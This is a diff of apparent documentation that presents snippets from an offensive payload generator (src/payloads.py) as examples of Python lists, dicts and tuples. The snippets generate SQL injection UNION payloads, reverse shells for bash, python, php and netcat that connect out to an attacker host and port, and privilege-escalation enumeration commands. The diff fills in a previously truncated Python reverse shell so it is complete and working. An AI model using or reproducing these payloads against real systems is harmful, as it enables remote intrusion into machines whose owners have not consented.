@@ -375,9 +375,11 @@ def generate_sqli_payloads(
             f"' UNION SELECT {','.join([str(i) for i in range(1, cols+1)])}--",
         ]
     
-    # List is iterated to build output
+    # List is iterated to build output string
+    output = ""
     for i, payload in enumerate(payloads, 1):
         output += f"{i}. `{payload}`\n"
+    return output
 ```
 
 ### Dict as Lookup Registry (from `src/payloads.py`)
@@ -395,14 +397,20 @@ def generate_reverse_shell(
     # Dict as registry mapping shell types to payload templates
     payloads = {
         "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
-        "python": f"python -c 'import socket,subprocess,os;s=socket.socket(...)'",
-        "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh...\");'",
-        "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command ...",
+        "python": (
+            f"python -c 'import socket,subprocess,os;"
+            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
+            f"s.connect((\"{lhost}\",{lport}));"
+            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
+            f"subprocess.call([\"/bin/sh\",\"-i\"])'"
+        ),
+        "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
         "netcat": f"nc -e /bin/sh {lhost} {lport}",
     }
     
     # Fast lookup by key with fallback
     payload = payloads.get(shell_type, payloads["bash"])
+    return payload
 ```
 
 ### Tuple as Grouped Values (from `src/payloads.py`)
@@ -426,9 +434,11 @@ def generate_privesc_enum(self, target_os: str, check_type: str) -> str:
                 ("SGID Binaries", "find / -perm -2000 -type f 2>/dev/null"),
             ])
     
-    # Tuples unpacked during iteration
+    # Tuples unpacked during iteration to build output
+    output = ""
     for title, cmd in commands:
         output += f"### {title}\n```bash\n{cmd}\n```\n\n"
+    return output
 ```
 
 ---
